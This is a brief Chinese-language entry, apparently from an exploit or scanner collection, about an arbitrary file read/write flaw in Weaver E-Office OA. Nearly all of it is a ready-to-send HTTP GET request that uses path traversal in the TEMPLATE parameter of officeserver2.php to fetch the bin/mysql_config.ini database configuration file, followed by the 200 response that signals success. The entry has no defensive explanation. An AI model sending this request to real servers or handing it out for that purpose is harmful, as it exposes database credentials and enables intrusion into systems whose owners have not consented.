# 泛微E-Office文件读取漏洞

泛微OA ｜ 任意文件读取/写入 ｜ —
- **请求**：`GET /iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini HTTP/1.1`
- **响应特征**：200